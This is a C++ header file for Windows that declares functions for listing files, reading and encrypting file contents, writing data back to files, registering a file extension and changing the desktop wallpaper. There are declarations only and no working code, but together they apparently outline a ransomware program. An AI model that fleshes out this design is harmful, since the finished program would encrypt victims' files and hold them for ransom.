#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <shlobj.h>
#include <shobjidl.h>

#ifndef MY_FUNCTIONS_H
#define MY_FUNCTIONS_H

void UpdateRegExts(const char* extention);
void ListFiles(const std::string& directory, std::vector<std::string>& files);
BYTE* EncryptData(char* context, DWORD& encrypted_len);
char* GetFileContext(const char* file_path, DWORD& file_size);
BOOL AppendFileData(const char* file_path, const BYTE* buffer, DWORD buffer_len);
PWSTR GetDesktopPath();
void GetBackGroundImage();
void ChangeBackground(LPCWSTR icon_path);

#endif